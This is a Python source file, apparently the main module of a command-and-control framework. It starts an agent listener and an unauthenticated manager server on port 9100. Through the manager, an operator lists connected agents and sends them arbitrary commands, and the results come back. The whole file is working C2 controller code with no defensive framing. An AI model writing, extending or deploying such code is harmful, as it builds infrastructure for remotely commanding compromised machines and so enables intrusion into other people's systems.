
import asyncio
import json

from pydantic import  ValidationError
from .Server.Server import Server
from .Managers.connection_manager import ConnectionManager
from .Models.protocols import SOCKET_BASE_MESSAGE_HEADER, SIZE_OF_SOCKET_BASE_MESSAGE_HEADER
from .Utils.tools import (
    pack_base_header,
    unpack_base_header
)
from .settings.config import (
    internalapplogger as logger
)
from .Models.remote_tools_schemas import (
    ManagerAction, 
    ManagerRequest, 
    ManagerResponse
)




async def read_manager_request(reader: asyncio.StreamReader) -> ManagerRequest:
    """
    1) Read the 4-byte header => payload_length
    2) Read that many bytes => parse as JSON
    3) Validate with Pydantic => ManagerRequest
    """
    # 1) Read the length header
    header_data = await reader.readexactly(SIZE_OF_SOCKET_BASE_MESSAGE_HEADER)
    header = unpack_base_header(header_data)
    payload_len = header.payload_length

    # 2) Read the JSON payload
    payload_data = await reader.readexactly(payload_len)

    # 3) Parse JSON -> Pydantic
    try:
        payload_dict = json.loads(payload_data.decode("utf-8", "ignore"))
        req = ManagerRequest(**payload_dict)
        return req
    except (json.JSONDecodeError, ValidationError) as e:
        raise ValueError(f"Invalid manager request: {e}")

async def write_manager_response(writer: asyncio.StreamWriter, resp: ManagerResponse):
    """
    1) Convert 'resp' to JSON
    2) Build 4-byte header with the length of that JSON
    3) Write header + payload
    """
    resp_json = resp.model_dump()  # Pydantic -> dict
    resp_bytes = json.dumps(resp_json).encode("utf-8")
    # Build header
    response_header = SOCKET_BASE_MESSAGE_HEADER()
    response_header.payload_length = len(resp_bytes)
    hdr_data = pack_base_header(response_header)

    # Write
    writer.write(hdr_data)
    writer.write(resp_bytes)
    await writer.drain()

# -----------------------------------------------------------------------
# 4) The manager server that uses read/write for the manager protocol
# -----------------------------------------------------------------------

async def manager_handle(reader: asyncio.StreamReader, writer: asyncio.StreamWriter, server: Server):
    """
    We'll repeatedly:
    - read a manager request (4-byte header + JSON)
    - dispatch based on request.action
    - send back a manager response (4-byte header + JSON)
    """
    conn_mgr: ConnectionManager = server.connection_manager

    while True:
        try:
            req = await read_manager_request(reader)
        except asyncio.IncompleteReadError:
            # Client closed connection
            break
        except ValueError as e:
            # Could not parse or validate
            err_resp = ManagerResponse(success=False, error=str(e))
            await write_manager_response(writer, err_resp)
            continue

        # We have a valid ManagerRequest -> dispatch
        if req.action == ManagerAction.GET_CONNECTIONS:
            # Return list of connection IDs
            all_conns = list(conn_mgr.get_all_connections().keys())
            resp = ManagerResponse(success=True, data={"connections": all_conns})
            await write_manager_response(writer, resp)

        elif req.action == ManagerAction.SEND_COMMAND:
            if not req.conn_id or not req.command:
                resp = ManagerResponse(success=False, error="Missing conn_id or command")
                await write_manager_response(writer, resp)
                continue

            conn_obj = conn_mgr.get_connection(req.conn_id)
            if not conn_obj:
                resp = ManagerResponse(success=False, error="No such connection")
                await write_manager_response(writer, resp)
                continue

            # Send command
            result_bytes = await conn_obj.send_command(req.command)
            if result_bytes is None:
                resp = ManagerResponse(success=False, error="Connection closed or no response")
            else:
                resp = ManagerResponse(success=True, data={"result": result_bytes.decode("utf-8", "ignore")})
            await write_manager_response(writer, resp)

        else:
            # Unknown action
            resp = ManagerResponse(success=False, error=f"Unknown action: {req.action}")
            await write_manager_response(writer, resp)

    writer.close()

async def start_manager_server(server: Server, host="0.0.0.0", port=9100):
    mgr_srv = await asyncio.start_server(
        lambda r, w: manager_handle(r, w, server),
        host,
        port
    )
    logger.info(f"Manager server listening on {host}:{port}")
    async with mgr_srv:
        await mgr_srv.serve_forever()

# -----------------------------------------------------------------------
# 5) Main: Start agent server + manager server
# -----------------------------------------------------------------------

async def _main():
    # Create your existing server instance
    c2_server = Server()

    # Wait for redis connect or handshake, if needed
    await c2_server.connection_manager.wait_until_connected()

    # Start the agent server (port from config via SERVER_HOST, SERVER_PORT)
    # This calls "await asyncio.start_server(self._handle_client, ...)" inside
    agent_task = asyncio.create_task(c2_server.start())

    # Start the manager server on port 9100
    manager_task = asyncio.create_task(start_manager_server(c2_server, "0.0.0.0", 9100))

    # Just wait for both tasks to run forever or until error
    done, pending = await asyncio.wait(
        [agent_task, manager_task],
        return_when=asyncio.FIRST_EXCEPTION
    )

    # If one fails, log or handle
    for t in done:
        exc = t.exception()
        if exc:
            logger.error(f"Task crashed: {exc}")
            # possibly cancel others
            for p in pending:
                p.cancel()

def main():
    asyncio.run(_main())


if __name__ == "__main__":
    main()

